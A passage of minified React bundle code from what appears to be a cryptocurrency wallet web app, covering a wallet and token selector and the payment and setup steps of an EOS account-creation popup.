                    className: Ht()(Jl.listTicker, t.isTestnet ? Jl.isTestnet : "", i(t) ? Jl.isHidden : "", Jl.iconMarginRigt),
                    isSmallIcon: !0
                }), O.createElement("span", {
                    className: Jl.titleContainer
                }, O.createElement("span", {
                    className: Ht()(Jl.titleWrapper, e.isNewSelector && Jl.newSelectorTicker)
                }, e.isNewSelector && O.createElement("span", {
                    className: Jl.walletInfo
                }, (0,
                be.Ui)(c, e.isSelectorWithValue ? 8 : 15))), O.createElement("div", {
                    className: Jl.walletType
                }, l && "WO", t.isTestnet && "Testnet", s && "Ledger", r && "Multisig"))))), m && O.createElement("div", {
                    className: Jl.addressWrapper
                }, hideAddress(t.address)))
            }
            ), [i, e, m])
              , b = (0,
            O.useCallback)((function(t, a, n, r) {
                let l = arguments.length > 4 && void 0 !== arguments[4] && arguments[4]
                  , s = arguments.length > 5 && void 0 !== arguments[5] && arguments[5];
                const i = _(t, r)
                  , o = t.isNewWallet || t.isNewToken ? void 0 : w(t, r)
                  , c = _(t, r, !0, l, s)
                  , u = !t.uuid || t.isFake;
                if ("list" === a) {
                    var d, m, p;
                    return O.createElement("div", {
                        className: Ht()(Jl.currencyBlock, {
                            [Jl.isDisabled]: r,
                            [Jl.spaceBetween]: e.isNewSelector,
                            [Jl.paddingRight]: e.isNewSelector,
                            [Jl.currencyBlockSelectorWithValue]: e.isSelectorWithValue
                        }),
                        onClick: v(t, r, t.isFake),
                        "data-parent-wallet-uuid": null == t ? void 0 : t.parentUuid,
                        "data-wallet-uuid": t.uuid,
                        "data-is-fake-wallet": u,
                        "data-wallet-currency": u ? null === (d = t.currency) || void 0 === d ? void 0 : d.toLowerCase() : void 0,
                        "data-wallet-family": u ? null === (m = t.family) || void 0 === m ? void 0 : m.toLowerCase() : void 0,
                        key: `select-currency${null == t ? void 0 : t.address}${null == t ? void 0 : t.uuid}${t.currency}${n}` + (null == t || null === (p = t.title) || void 0 === p ? void 0 : p.replaceAll(" ", ""))
                    }, i)
                }
                if ("sub-list" === a) {
                    var f;
                    return O.createElement("div", {
                        className: Ht()(Jl.currencySubBlock, {
                            [Jl.isDisabled]: r,
                            [Jl.spaceBetween]: e.isNewSelector,
                            [Jl.paddingRight]: e.isNewSelector
                        }),
                        onClick: v(t, r),
                        key: `select-currency${null == t ? void 0 : t.address}${null == t ? void 0 : t.uuid}${t.currency}${n}` + (null == t || null === (f = t.title) || void 0 === f ? void 0 : f.replaceAll(" ", "")),
                        "data-parent-wallet-uuid": n,
                        "data-wallet-uuid": t.uuid
                    }, o)
                }
                return O.createElement("div", {
                    className: Ht()(Jl.currencyBlock, Jl.selectedItem, {
                        [Jl.isDisabled]: !l && r,
                        [Jl.spaceBetween]: e.isNewSelector
                    })
                }, c)
            }
            ), [_, w, v])
              , handleRenderResult = (e, t, a, n) => {
                const r = [{
                    item: O.createElement("div", {
                        key: "YOUR-COINS",
                        className: Ht()(Jl.wrapperText, Jl.stickyHeader),
                        "data-block-header": !0
                    }, "YOUR COINS"),
                    header: ph.coins
                }, ...e.map((e => ({
                    item: e,
                    header: ph.coins
                })))]
                  , l = [{
                    item: O.createElement("div", {
                        key: "YOUR-TOKENS",
                        className: Ht()(Jl.wrapperText, Jl.stickyHeader),
                        "data-block-header": !0
                    }, "YOUR TOKENS"),
                    header: ph.tokens
                }, ...t.map((e => ({
                    item: e,
                    header: ph.tokens
                })))]
                  , s = [{
                    item: O.createElement("div", {
                        key: "ADD-COINS",
                        className: Ht()(Jl.wrapperText, Jl.stickyHeader),
                        "data-block-header": !0
                    }, "ADD COINS"),
                    header: ph.addCoins
                }, ...n.map((e => ({
                    item: e,
                    header: ph.addCoins
                })))]
                  , i = [{
                    item: O.createElement("div", {
                        key: "ADD-TOKENS",
                        className: Ht()(Jl.wrapperText, Jl.stickyHeader),
                        "data-block-header": !0
                    }, "ADD TOKENS"),
                    header: ph.addTokens
                }, ...a.map((e => ({
                    item: e,
                    header: ph.addTokens
                })))]
                  , o = [];
                if (!(e.length || t.length || null != a && a.length || n.length))
                    return o;
                e.length && o.push(...r);
                t.length && o.push(...l);
                null != n && n.length && o.push(...s);
                null != a && a.length && o.push(...i);
                return o
            }
              , k = (0,
            O.useCallback)(( (t, a, n, r, l, s, i, u) => {
                const d = []
                  , m = []
                  , E = []
                  , h = []
                  , g = []
                  , y = [];
                t.forEach((t => {
                    var r, l, s, i;
                    if (e.withoutWatchOnly && t.watchOnly)
                        return;
                    let c = !a || checkIsWalletMatchSearch(t, a);
                    e.isBorrowWallets && ![t].find(null !== (r = e.customFilter) && void 0 !== r ? r : () => !0) && (c = !1);
                    (c && !e.sendToWallets || c && e.sendToWallets === (null == t || null === (l = t.currency) || void 0 === l ? void 0 : l.toUpperCase())) && y.push(t);
                    const p = e.isDisabledParentWallet || 0 === [t].filter(null !== (s = e.additionalFilter) && void 0 !== s ? s : () => !0).length
                      , resultCoinsPush = () => {
                        n && c ? m.push(b(t, "list", t.uuid, p)) : n || d.push(b(t, "list", t.uuid, p))
                    }
                    ;
                    u ? "0" !== (null == t ? void 0 : t.balance) && "" !== (null == t ? void 0 : t.balance) && resultCoinsPush() : resultCoinsPush();
                    if (e.withoutSubwallets || e.isRenderAllExchangeCoinsAndTokens)
                        return;
                    const f = e.withoutWatchOnly && t.isWatchOnly;
                    if (null !== (i = t.subWallets) && void 0 !== i && i.length && !t.subWalletsHidden) {
                        var h;
                        const r = a ? filterWallets(t.subWallets, a) : t.subWallets;
                        let l = [...new Map([...r].map((e => [e.uuid, e]))).values()];
                        l = o({
                            wallets: l
                        });
                        l.filter(null !== (h = e.customFilter) && void 0 !== h ? h : () => !0).forEach((a => {
                            var r;
                            if (e.sendToWallets && e.sendToWallets !== (null == a || null === (r = a.currency) || void 0 === r ? void 0 : r.toUpperCase()))
                                return;
                            t.isWatchOnly && (a.data.watchOnly = t.isWatchOnly);
                            a.data.parentUuid = t.uuid;
                            const resultTokensPush = () => {
                                n ? E.push(b(a, "list", t.uuid, f)) : d.push(b(a, "sub-list", t.uuid, f));
                                y.push(a)
                            }
                            ;
                            u ? "0" !== (null == a ? void 0 : a.balance) && "" !== (null == a ? void 0 : a.balance) && resultTokensPush() : resultTokensPush()
                        }
                        ))
                    }
                    if (e.withMultisigs && t.multisigs) {
                        const e = undefined;
                        (a ? filterWallets(t.multisigs, a, {
                            withoutSubwallets: !0
                        }) : t.multisigs).forEach((e => {
                            const resultCoinsPush = () => {
                                n ? m.push(b(e, "list", t.uuid, f)) : d.push(b(e, "sub-list", t.uuid, f));
                                y.push(e)
                            }
                            ;
                            u ? "0" !== (null == e ? void 0 : e.balance) && "" !== (null == e ? void 0 : e.balance) && resultCoinsPush() : resultCoinsPush()
                        }
                        ))
                    }
                }
                ));
                if (null != s && s.length) {
                    var v;
                    const t = undefined
                      , n = undefined;
                    s.filter(null !== (v = e.customFilter) && void 0 !== v ? v : () => !0).sort(( (e, t) => c({
                        a: e,
                        b: t,
                        searchValue: a
                    }))).forEach((e => {
                        e.address = "";
                        h.push(b(e, "list", e.uuid))
                    }
                    ))
                }
                null != i && i.length && 0 !== (null == a ? void 0 : a.length) && i.forEach((e => {
                    e.address = "";
                    g.push(b(e, "list", e.uuid))
                }
                ));
                if (p || f || e.isSelectorWithValue && !e.isRenderAllExchangeCoinsAndTokens)
                    return handleRenderResult(m, E, h, g);
                if (n && (!r || e.isSelectorWithValue) && !e.isRenderAllExchangeCoinsAndTokens)
                    return handleRenderResult(m, E, h, []);
                if (n && r && !l && !e.isRenderAllExchangeCoinsAndTokens) {
                    const e = undefined;
                    return o({
                        wallets: y
                    }).map((e => b(e, "list", e.uuid)))
                }
                return n && r && l || e.isRenderAllExchangeCoinsAndTokens ? y.map((e => b(e, "list", e.uuid))) : d
            }
            ), [e.withoutWatchOnly, e.isDisabledParentWallet, e.withoutSubwallets, e.withMultisigs, e.customFilter, b, o])
              , S = undefined;
            return {
                renderItem: b,
                isVisible: a,
                setVisible: n,
                handleClose: y,
                search: r,
                setSearch: l,
                handleSearch: e => {
                    let {target: {value: t}} = e;
                    return E(t.toLocaleLowerCase().replace(/\s+/g, " ").trim())
                }
                ,
                renderWallets: k
            }
        }
        const gh = "extra-blocks_wrapper_20S9r app_wrapperBlock_2EpA3"
          , yh = "extra-blocks_wrapperTitle_2H7Co"
          , vh = "extra-blocks_addWalletItem_3tXHs"
          , _h = "extra-blocks_walletItem_YV2Ct"
          , wh = "extra-blocks_addTokenItem_3jBYY"
          , bh = "extra-blocks_addTokenItemWrapper_2wpzN"
          , kh = "extra-blocks_promoBlock_1MBAi"
          , Sh = "extra-blocks_promoBlockUd_AceI0"
          , Ch = "extra-blocks_promoWrapper_85OfE"
          , Nh = "extra-blocks_ledgerIcon_bTpgT"
          , Th = "extra-blocks_addIconCurrency_fn4gz"
          , Ah = "extra-blocks_addIconToken_Jzk4t"
          , xh = "extra-blocks_addButton_1l_5U"
          , Ih = "extra-blocks_isOpen_1OH4K"
          , Ph = "extra-blocks_tools_3y5XS"
          , Lh = "extra-blocks_arrow_2J-j1"
          , Fh = "extra-blocks_arrowImage_136XZ"
          , Wh = "extra-blocks_ticker_2e99b"
          , useCreateWallet = e => {
            let {callback: t} = e;
            const a = usePopup()
              , n = (0,
            $.I0)()
              , r = (0,
            $.v9)(su)
              , l = (0,
            $.v9)(zc);
            (0,
            O.useEffect)(( () => {
                n(rd.setNewCreatedWalletId({
                    walletId: null
                }))
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                r && t && t(r)
            }
            ), [r]);
            const s = (0,
            O.useCallback)((e => {
                let {currency: t, isCoin: r, smartContract: l} = e;
                "eos" !== t ? "hbar" !== t ? n(rd.createWallet({
                    isCoin: r,
                    smartContract: l,
                    currency: t,
                    downloadType: Sm.AFTER_CREATE_WALLET
                })) : a.open("import-or-create", {
                    initialTab: "create",
                    currency: "hbar"
                }) : a.open("create-eos")
            }
            ), [n, a]);
            return {
                createWallet: s,
                isLoadingCreateWallet: l
            }
        }
          , WalletAllItem = e => {
            var t;
            let {currency: a} = e;
            const [n,r] = (0,
            O.useState)(!1)
              , {createWallet: l} = useCreateWallet({})
              , loadingHandler = async () => {
                r(!0);
                l({
                    currency: a,
                    isCoin: !0
                })
            }
              , s = (0,
            be.II)(a);
            return O.createElement("div", {
                className: vh
            }, O.createElement("div", {
                className: _h
            }, O.createElement(IconCurrency, {
                currency: a,
                className: Th
            }), s && O.createElement("div", null, O.createElement("div", null, s.title), O.createElement("div", {
                className: Wh
            }, null === (t = s.ticker) || void 0 === t ? void 0 : t.toUpperCase()))), O.createElement(Yl, {
                color: "light-blue",
                size: "small",
                onClick: loadingHandler,
                isLoading: n
            }, "Add"))
        }
          , Rh = WalletAllItem
          , Bh = a.p + "5a823c3b70b3c1ef95aa28517c918a1c.svg"
          , Oh = a.p + "40afdb87d0c63dc0fb2077f2fde2353c.svg";
        function InputWalletsList(e) {
            const {search: t, handleSearch: a, renderWallets: n} = useRenderWallets(e)
              , r = O.createRef()
              , {currenciesToBuy: l, exchangesCurrencies: s, isBorrowWallets: i, tokenGenPaymentCurrencies: o, eosPaymentCurrencies: c, udManagingCurrencies: u, udListOfCurrencies: d, fioWallets: m, stakingCurrency: p, sendToWallets: f, isNewStyles: E, onChange: h, setVisible: g, withoutSubwallets: y, wallets: v, customFilter: _, noWalletsToShow: w, emptyPlaceholder: b, isNewSelector: k, notSortByCmc: S, newTokens: C, isSelectorWithValue: N, isRenderAllExchangeCoinsAndTokens: T, listOfAllExchangeAssets: A, newCoins: x} = e
              , I = {
                withoutSubwallets: y,
                wallets: v || [],
                customFilter: null != _ ? _ : () => !0,
                isNewSelector: k,
                isRenderAllExchangeCoinsAndTokens: T,
                isBorrowWallets: i,
                isForce: !0
            }
              , {listOfCurrencies: P, list: L} = useRenderCurrencyAndToken(t, I)
              , F = (0,
            O.useMemo)(( () => {
                if (T)
                    return A || [];
                const e = new Map
                  , t = L.filter((t => {
                    try {
                        const a = t.data ? t.data.uuid : t.uuid;
                        if (e.has(a))
                            return !1;
                        e.set(a, {});
                        return !0
                    } catch (e) {
                        return !1
                    }
                }
                )) || [];
                return t
            }
            ), [T, L, A, i])
              , W = (0,
            O.useMemo)(( () => C && C.length && t ? filterWallets(C, t) : []), [C, t])
              , R = (0,
            O.useMemo)(( () => x && x.length ? t ? filterWallets(x, t) : x : []), [x, t])
              , B = (0,
            O.useMemo)(( () => {
                const e = undefined
                  , a = undefined;
                return n(F, t, k, !t, S, W, R, !0 === s && void 0 === T && void 0 === A)
            }
            ), [n, F, t, k, S, W, R])
              , D = (0,
            O.useMemo)(( () => !(null != B && B.length) && !t || w), [w, t, null == B ? void 0 : B.length])
              , M = (0,
            O.useMemo)(( () => Boolean(k && !T && (t || N))), [k, T, N, t])
              , enterHandler = e => {
                if (h) {
                    const t = null == e ? void 0 : e.props["data-parent-wallet-uuid"]
                      , a = null == e ? void 0 : e.props["data-wallet-uuid"];
                    if (t) {
                        const e = L.find((e => e.uuid === t))
                          , n = null == C ? void 0 : C.find((e => e.uuid === a))
                          , r = (null == e ? void 0 : e.subWallets.find((e => e.uuid === a))) || (null == e ? void 0 : e.multisigs.find((e => e.multisigId === a)));
                        r ? h(r) : n && h(n)
                    } else {
                        const t = L.find((e => e.uuid === a));
                        t && h(t);
                        if (null != e && e.props["data-is-fake-wallet"]) {
                            const t = null == e ? void 0 : e.props["data-wallet-currency"]
                              , a = null == e ? void 0 : e.props["data-wallet-family"];
                            h({
                                currency: t,
                                family: a,
                                isFakeWallet: !0
                            })
                        }
                    }
                }
                g && g(!1)
            }
            ;
            return O.createElement(O.Fragment, null, O.createElement("span", {
                className: Ht()(Jl.searchWrapper, E && Jl.newSearchWrapper, N && Jl.searchWrapperWithValue)
            }, O.createElement("input", {
                ref: r,
                onChange: a,
                defaultValue: t,
                autoFocus: !0,
                placeholder: "Search wallet",
                type: "text",
                className: Ht()(Jl.searchInput, E && Jl.newSearchInput, N && Jl.searchInputWithValue),
                spellCheck: "false",
                autoCorrect: "off",
                autoComplete: "off"
            }), E && O.createElement("img", {
                width: "20",
                height: "20",
                alt: "",
                className: Jl.SearchIcon,
                src: Oh
            })), E && !!t && O.createElement("span", {
                onClick: e => {
                    e.stopPropagation();
                    a({
                        target: {
                            value: ""
                        }
                    });
                    r.current && (r.current.value = "")
                }
                ,
                className: Ht()(Jl.icon, Jl.clearPassIcon)
            }), O.createElement("div", {
                className: E ? Jl.newScrollBar : void 0
            }, O.createElement(VirtualizedList, {
                walletsToRender: B,
                isWithHeaders: M,
                search: t,
                enterHandler
            }), !(null != B && B.length) && !!P.length && !!t && !k && O.createElement("div", {
                className: Jl.wrapper
            }, O.createElement("p", {
                className: Jl.wrapperText
            }, "Available"), P.map((e => null != e && e.ticker ? O.createElement(Rh, {
                currency: null == e ? void 0 : e.ticker,
                key: `addwallet${null == e ? void 0 : e.ticker}`
            }) : null))), D && O.createElement("div", {
                className: Jl.emptyState
            }, O.createElement("img", {
                src: Bh,
                alt: "",
                width: "30"
            }), O.createElement("p", null, "You don’t have any wallets.")), !(null != B && B.length) && (!P.length || k) && !!t && !l && !s && !i && !o && !c && !u && !d && !m && !p && !f && O.createElement("div", {
                className: Jl.emptyState
            }, b || O.createElement("p", null, 'No results found for "', t, '"')), !(null != B && B.length) && !W.length && (!P.length || k) && !!t && (l || o || s || i) && O.createElement("div", {
                className: Jl.emptyState
            }, b || O.createElement("p", null, "No results found among the currencies that support this operation")), !(null != B && B.length) && !P.length && !!t && (c || u || d || m || p || f) && O.createElement("div", {
                className: Jl.emptyState
            }, b || O.createElement("p", null, "You can select only ", c && "BTC", u && "ETH", m && "FIO", d && d.toUpperCase(), p && p, f && f, " here"))))
        }
        InputWalletsList.defaultProps = {
            withoutSubwallets: !1,
            customFilter: () => !0
        };
        function input_wallets_extends() {
            input_wallets_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return input_wallets_extends.apply(this, arguments)
        }
        const Dh = O.forwardRef(( (e, t) => {
            const a = (0,
            $.I0)()
              , {renderItem: n, isVisible: r, setVisible: l, handleClose: s} = useRenderWallets(e)
              , {isNoBorder: i, isBoxSizing: o, isNewStyles: c, withAddress: u, noDisabledStyle: d, withArrowWhenDisabled: m, noTicker: p, isLoading: f, disabled: E, updateBalanceOnChange: h, selectedWallet: g, inputWrapperClassName: y, placeholder: v, newArrow: _, isNewSelector: w, customWrapperList: b, isSelectorWithValue: k} = e
              , S = f || E;
            O.useEffect(( () => {
                h && g && (g.isNewWallet || g.isNewToken || a(updateBalanceByWallet(g, !1)))
            }
            ), [a, h, g]);
            return O.createElement("div", {
                ref: t,
                className: Jl.wrapper,
                tabIndex: 0,
                role: "button"
            }, O.createElement("div", {
                className: Ht()(Jl.inputWrapper, {
                    [Jl.placeholder]: !g,
                    [Jl.isOpen]: r,
                    [Jl.isNoBorder]: i,
                    [Jl.isInactive]: S,
                    [Jl.isBoxSizing]: o,
                    [Jl.withAddress]: u,
                    [Jl.placeholderSelectorWithValue]: !g && k
                }, y),
                onClick: () => l(!r)
            }, !f && g && n(g, "select", g.uuid, S, d, p), !f && !g && O.createElement("span", {
                key: "select-wallet",
                className: c ? Jl.noMargin : void 0
            }, v || "Select wallet"), f && O.createElement("div", {
                key: "loader-dots",
                className: Jl.walletsLoader
            }, O.createElement(LoaderDots, {
                visible: !0
            })), !f && u && m && g && O.createElement("div", {
                key: "icon-arrow",
                className: Jl.arrowWrapper
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: Gd()
                },
                className: Ht()(Jl.refIcon)
            })), !f && u && !0 !== E && !m && g && O.createElement("div", {
                className: Jl.arrowWrapper
            }, O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: Gd()
                },
                className: Ht()(Jl.refIcon)
            })), !0 !== E && !u && O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: _ ? dh() : Gd()
                },
                className: Ht()(Jl.iconArrow, {
                    [Jl.newIconArrow]: _,
                    [Jl.iconNewSelector]: w,
                    [Jl.newSelectorWithValueIcon]: k
                })
            })), !0 !== E && O.createElement(Xl(), {
                visible: r,
                onClose: s
            }, O.createElement("div", {
                className: Ht()(Jl.wrapperList, c && Jl.newWrapperList, u && Jl.withAddressWrapper, b),
                onClick: s
            }, O.createElement(InputWalletsList, input_wallets_extends({}, e, {
                setVisible: l,
                withAddress: u
            })))))
        }
        ));
        Dh.displayName = "InputWallets";
        Dh.defaultProps = {
            withoutSubwallets: !1,
            customFilter: () => !0
        };
        const Mh = Dh
          , Uh = {
            inputCurrencyContainer: "choose-wallet_inputCurrencyContainer_AlmW_",
            detailsBlock: "choose-wallet_detailsBlock_3giD-",
            error: "choose-wallet_error_A8AGa",
            status: "choose-wallet_status_1Ui57",
            faqLink: "choose-wallet_faqLink_O2Edl",
            infoBlock: "choose-wallet_infoBlock_P2uAS",
            loaderWrapper: "choose-wallet_loaderWrapper_2P_KH",
            backButton: "choose-wallet_backButton_2jkyQ styles_dashedNormal_xEvl8",
            stepInfo: "choose-wallet_stepInfo_1UKJx",
            footer: "choose-wallet_footer_36WOA",
            iconNewTab: "choose-wallet_iconNewTab_1y-eT"
        };
        function onCustomFilterWallets(e, t, a) {
            var n, r, l;
            if (!e)
                return !1;
            if (a && a.withoutWatchOnly && e.isWatchOnly)
                return !1;
            if (a && a.additionalFilter && (e.isSubWallet || e.isFakeToken))
                return a.additionalFilter(e);
            if (a && a.findAmongWallets)
                return !!a.findAmongWallets.find((t => t.currency === e.currency || t.ticker === e.ticker));
            if (a && a.exchangesCurrencies) {
                var s, i;
                const t = Gl("changenow", {
                    family: e.family || e.currency,
                    currency: e.currency
                }).currency
                  , n = Gl("changenow", {
                    family: e.family || e.currency,
                    currency: e.currency
                }).family
                  , r = (0,
                be.uL)(t).toLowerCase()
                  , l = n || r
                  , o = null === (s = e.smartContract) || void 0 === s ? void 0 : s.toLocaleLowerCase();
                return !(null === (i = a.exchangesCurrencies) || void 0 === i || !i.length) && !!a.exchangesCurrencies.find((e => {
                    var t;
                    if (e.ticker === e.family)
                        return e.ticker === r && e.family === l;
                    const a = null === (t = e.smartContract) || void 0 === t ? void 0 : t.toLocaleLowerCase();
                    return e.ticker === r && e.family === l && a === o
                }
                ))
            }
            return null != a && null !== (n = a.borrowLoansCurrencies) && void 0 !== n && n.length ? !(null == a || !a.borrowLoansCurrencies.find((t => {
                var n;
                const r = (0,
                Ho.t)(t.currency) === (0,
                Ho.t)(null == e ? void 0 : e.currency)
                  , l = (0,
                Ho.t)(t.network) === (0,
                Ho.t)((null == e ? void 0 : e.family) || e.currency);
                return a.withSubWallets && null !== (n = e.subWallets) && void 0 !== n && n.length ? e.subWallets.some((e => {
                    const a = (0,
                    Ho.t)(t.currency) === (0,
                    Ho.t)(null == e ? void 0 : e.currency)
                      , n = (0,
                    Ho.t)(t.network) === (0,
                    Ho.t)((null == e ? void 0 : e.family) || e.currency);
                    return a && n
                }
                )) : r && l
            }
            ))) : t.includes(null !== (r = null !== (l = e.currency) && void 0 !== l ? l : e.ticker) && void 0 !== r ? r : "")
        }
        const Gh = "Initializing payment record ..."
          , Vh = "Calculating payment fee ...";
        function ChooseWalletStep(e) {
            var t;
            const [a,n] = (0,
            O.useState)([])
              , [r,l] = (0,
            O.useState)(null)
              , [s,i] = (0,
            O.useState)({})
              , [o,c] = (0,
            O.useState)(!1)
              , [u,d] = (0,
            O.useState)("")
              , [m,p] = (0,
            O.useState)("")
              , [f,E] = (0,
            O.useState)(!1)
              , [h,g] = (0,
            O.useState)("")
              , [y,v] = (0,
            O.useState)("")
              , {isAvailableRate: _} = useConverter()
              , w = O.createRef()
              , walletValidator = e => [{
                rule: e => !!e,
                message: "Wallet not selected"
            }, {
                rule: () => !e,
                message: "Insufficient funds"
            }]
              , b = (0,
            $.v9)($c);
            (0,
            O.useEffect)(( () => {
                const e = b.filter((e => ["btc"].indexOf(e.currency) >= 0));
                n(e)
            }
            ), [b]);
            const k = (0,
            Ko.lt)((0,
            Ko.PD)(h, y), (null == r ? void 0 : r.balance) || "0")
              , handleWalletChange = async e => {
                c(!1);
                const t = "eos" === e.currency;
                l(e);
                E(!0);
                p(Gh);
                try {
                    let a;
                    try {
                        ({data: a} = await U.nW.post("/api/v1/internal/eos/payment", {
                            fromCurrency: e.currency,
                            fromAddress: t && e.accountName ? e.accountName : e.address
                        }, {
                            headers: {
                                "Access-Control-Allow-Origin": "*"
                            }
                        }))
                    } catch (e) {
                        ge.b.error(ge.d.FAILED_INITIALIZE_EOS_CREATING, e);
                        throw new Error("Unexpected error has occured. Please try again or contact support")
                    }
                    let n = 0;
                    p(Vh);
                    if (!t)
                        try {
                            const t = await Se.Z.getApiByWallet(e)
                              , r = parseFloat((0,
                            Ko.$q)(await t.getDustThreshold(), t.precision));
                            a.from.amount = Math.max(r, a.from.amount);
                            a.to.amount = Math.max(r, a.to.amount);
                            ({fee: n} = await t.getFee({
                                addressFrom: e.address,
                                addressTo: e.address,
                                amount: a.from.amount
                            }));
                            n = parseFloat(String(n))
                        } catch (t) {
                            ge.b.error(ge.d.FAILED_GET_FEE_FOR_CREATE_EOS, {
                                currency: e.currency
                            }, t);
                            throw new Error(`Failed to get fee for ${e.currency.toUpperCase()}`)
                        }
                    i(a);
                    g(a.from.amount);
                    v(n.toString());
                    c(!1);
                    d("")
                } catch (e) {
                    i({});
                    g("");
                    v("");
                    c(!0);
                    d(e.message)
                }
                p("");
                E(!1)
            }
              , handleNext = () => {
                var t, a;
                const {isValid: n} = null !== (t = null === (a = w.current) || void 0 === a ? void 0 : a.validate()) && void 0 !== t ? t : {};
                n ? e.handleNext({
                    wallet: r,
                    paymentObj: s
                }) : c(!0)
            }
              , S = null == r || null === (t = r.currency) || void 0 === t ? void 0 : t.toUpperCase()
              , C = (0,
            Ko.PD)(h, y).toString();
            return O.createElement("div", {
                className: "step4"
            }, O.createElement(sf(), {
                ref: w
            }, O.createElement("h3", null, "Payment"), O.createElement("p", null, "The approximate initial payment is 6 EOS (in BTC) + BTC network fee. Get fully set up and registered account (you will have RAM, 4.2 EOS staked for CPU and 0.02 EOS for NET). Select a wallet to proceed with payment."), O.createElement("p", null, "Choose a wallet for payment"), O.createElement("div", {
                className: Uh.inputCurrencyContainer
            }, O.createElement(lf.ValidatorField, {
                value: r,
                rules: walletValidator(!(u || k))
            }, (e => {
                let {isValid: t, message: n} = e;
                return O.createElement(pa, {
                    message: n,
                    isInvalid: !t && o,
                    isSelect: !0
                }, O.createElement(Mh, {
                    selectedWallet: null != r ? r : void 0,
                    onChange: handleWalletChange,
                    withoutSubwallets: !0,
                    wallets: a,
                    customFilter: e => onCustomFilterWallets(e, ["btc"], {
                        withoutWatchOnly: !0
                    }),
                    eosPaymentCurrencies: !0
                }))
            }
            ))), O.createElement("div", {
                className: Uh.detailsBlock
            }, y && !f && r && _(r) && O.createElement("div", {
                className: Uh.infoBlock
            }, O.createElement("p", null, "Amount to transfer: ", h, " ", S), O.createElement("p", null, "Network fee: ", y, " ", S), r && "btc" === r.currency && O.createElement("p", null, "Total: ", C, " ", S)), m && O.createElement("div", {
                className: Uh.status
            }, m)), O.createElement("div", {
                className: Uh.footer
            }, O.createElement("div", {
                className: Uh.loaderWrapper
            }, O.createElement(lf.ValidatorField, {
                value: !f,
                rules: zf.bool
            }, (e => {
                let {isValid: t} = e;
                return t || o ? O.createElement(O.Fragment, null) : O.createElement("div", {
                    className: Ht()(Uh.stepInfo, Uh.wait)
                }, "Please wait ")
            }
            )), O.createElement(LoaderDots, {
                visible: f
            }), !f && O.createElement("div", {
                className: Uh.stepInfo
            }, "Step 2 of ", e.TOTAL_STEPS)), O.createElement("div", null, O.createElement("span", {
                className: Uh.backButton,
                onClick: e.handlePrev
            }, "Back"), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleNext
            }, "Confirm")))))
        }
        const Kh = ChooseWalletStep
          , Hh = a.p + "960726b53a426c08a36758fcd47e55af.svg"
          , zh = "popup-create-eos_wrapper_1iq0A"
          , jh = "popup-create-eos_inputAccountName_2S24T"
          , $h = "popup-create-eos_orText_1yz5N"
          , Zh = "popup-create-eos_valid_MAHqO"
          , Yh = "popup-create-eos_notValid_gwsIF"
          , qh = "popup-create-eos_inputCurrencyContainer_1XsOz"
          , Xh = "popup-create-eos_backButton_1Xbr9 styles_dashedNormal_xEvl8"
          , Qh = "popup-create-eos_stepInfo_9emsB"
          , Jh = "popup-create-eos_overlay_2G52b"
          , eg = "popup-create-eos_closeIcon_3J9I5"
          , tg = 3;
        let ag;
        ft.on("logout", (e => {
            let {dispatch: t} = e;
            EosAccountCreator.destroy();
            t(hideNotification())
        }
        ));
        const EosCreateAccountPopup = e => {
            const t = (0,
            $.I0)()
              , [a,n] = (0,
            O.useState)(0)
              , [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)(null)
              , [o,c] = (0,
            O.useState)("")
              , [u,d] = (0,
            O.useState)(!1)
              , m = usePopup()
              , p = (0,
            $.v9)(eu)
              , f = (0,
            $.v9)($c)
              , E = (0,
            $.v9)(oe.A0)
              , resetState = () => {
                n(0);
                l(!1);
                i(null);
                c("");
                d(!1)
            }
              , openNotification = () => {
                t(showNotification("EOS account creating...", !0))
            }
              , handleClosePopup = async () => {
                if (u) {
                    t(ie.mapDecryptedSecureStorage({
                        mapper: e => ({
                            ...e,
                            [qe]: null
                        })
                    }));
                    clearCreateAddressMetaState();
                    EosAccountCreator.destroy();
                    resetState()
                }
                EosAccountCreator.isStarted() && !u && openNotification();
                e.onClose()
            }
              , forciblyOpenPopup = async () => {
                m.open("create-eos")
            }
              , onFinish = async () => {
                d(!0)
            }
            ;
            (0,
            O.useEffect)(( () => {
                u && forciblyOpenPopup()
            }
            ), [forciblyOpenPopup, u]);
            const handleNotFoundWallet = async e => {
                const a = {
                    ...e
                };
                ge.b.error(ge.d.FAILED_CREATE_EOS_WALLET_NOT_FOUND, a);
                t(ie.mapDecryptedSecureStorage({
                    mapper: e => ({
                        ...e,
                        [qe]: void 0
                    })
                }))
            }
              , initData = async function() {
                let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
                const a = null == E ? void 0 : E["eos-account-creator"]
                  , n = {
                    ...a
                };
                if (a) {
                    if (a.wallet) {
                        const e = p(a.wallet.uuid);
                        if (!e) {
                            handleNotFoundWallet(n);
                            return
                        }
                        a.wallet = e
                    }
                    if (a.eosWallet) {
                        const e = p(a.eosWallet.uuid);
                        if (!e) {
                            handleNotFoundWallet(n);
                            return
                        }
                        a.eosWallet = e
                    }
                    i(a);
                    EosAccountCreator.isStarted() || t(showNotification("Сlick to continue creating EOS wallet"))
                } else
                    e || t(ie.mapDecryptedSecureStorage({
                        mapper: e => ({
                            ...e,
                            [qe]: void 0
                        })
                    }))
            };
            (0,
            O.useEffect)(( () => {
                window.clearTimeout(ag);
                ag = window.setTimeout(( () => {
                    f.length > 0 && initData(!0)
                }
                ), 100)
            }
            ), [f]);
            const goToNextStep = () => n(a + 1)
              , goToPrevStep = () => n(a - 1)
              , handleBack = () => {
                c("");
                goToPrevStep()
            }
              , handleSubmitAccountName = e => {
                c(e)
            }
            ;
            (0,
            O.useEffect)(( () => {
                o && n(2)
            }
            ), [o]);
            const handleChooseWallet = e => {
                let {wallet: t, paymentObj: a} = e;
                i({
                    payment: a,
                    wallet: t,
                    accountName: o,
                    machineState: qE.CREATE_API_TX_RECORD
                })
            }
            ;
            (0,
            O.useEffect)(( () => {
                s && n(3)
            }
            ), [s]);
            const handleOpenPopup = async () => {
                t(hideNotification());
